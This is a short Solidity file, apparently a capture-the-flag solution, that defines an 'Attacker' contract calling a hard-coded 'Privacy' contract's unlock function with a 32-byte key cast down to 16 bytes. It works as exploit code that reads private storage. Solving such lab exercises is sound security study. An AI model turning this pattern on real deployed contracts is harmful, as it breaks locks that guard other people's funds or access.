// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./privacy.sol";
import "hardhat/console.sol";

contract Attacker{
    Privacy victimContract; //Contractname contractvariable

    address victimAddress = 0xbae24653124CA68cEd2A23C395100d9250edA62A; 

    // // // import a contract
    constructor() public {
        victimContract = Privacy(victimAddress);
    }

    // Call the privacy function with a casted key
    function proxyUnlock(bytes32 _key) public{
        victimContract.unlock(bytes16(_key));
    }
   

}
